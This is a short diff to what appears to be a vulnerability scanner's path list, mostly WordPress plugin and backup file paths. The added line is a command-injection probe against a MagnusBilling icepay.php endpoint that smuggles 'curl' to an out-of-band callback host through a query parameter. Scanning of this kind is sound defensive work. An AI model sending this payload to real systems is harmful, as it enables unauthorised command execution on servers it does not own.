@@ -55,3 +55,4 @@
 /wp-content/uploads/wp-clone/wpclone_backup/prefix.txt
 /wp-content/plugins/eventon-lite/readme.txt
 /wp-content/plugins/wp-file-manager/readme.txt
+/mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};%23
